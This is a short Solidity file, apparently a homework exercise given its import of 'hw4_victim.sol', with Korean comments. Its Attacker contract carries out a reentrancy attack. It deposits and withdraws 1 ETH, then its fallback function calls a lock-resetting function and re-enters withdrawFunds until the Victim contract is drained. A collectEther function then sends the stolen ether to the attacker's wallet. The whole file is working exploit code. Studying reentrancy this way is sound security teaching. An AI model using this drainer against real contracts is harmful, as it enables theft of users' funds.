// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

import "hw4_victim.sol";

contract Attacker {
    Victim public victim;

    // 배포 시 Victim 컨트랙트 주소를 받아 저장
    constructor(address _victimAddress) public {
        victim = Victim(_victimAddress);
    }

    // 공격을 시작하는 함수: 이 함수를 호출할 때 반드시 1 ETH 이상을 함께 보내야 함
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

        // Victim에 1 이더 입금
        victim.depositFunds.value(1 ether)();

        // Victim에서 1 이더 인출 시도 -> 이더 전송 시점에 fallback()이 실행되면서 재진입 공격
        victim.withdrawFunds(1 ether);
    }

    // Victim으로부터 이더를 탈취하기 위한 fallback 함수
    function() external payable {
        // Victim 컨트랙트에 1 이더 이상 남아 있다면 계속 재진입 공격
        if (address(victim).balance >= 1 ether) {
            // locked 플래그를 다시 false로 만드는 취약한 함수 호출
            victim.refreshAuditStats();
            // 다시 출금 함수 호출하여 계속 재진입 공격 시도
            victim.withdrawFunds(1 ether);
        }
    }

    // 공격이 끝난 뒤, 공격자 지갑(EOA)로 탈취한 이더를 전부 전송하는 함수
    function collectEther() external {
        msg.sender.transfer(address(this).balance);
    }
}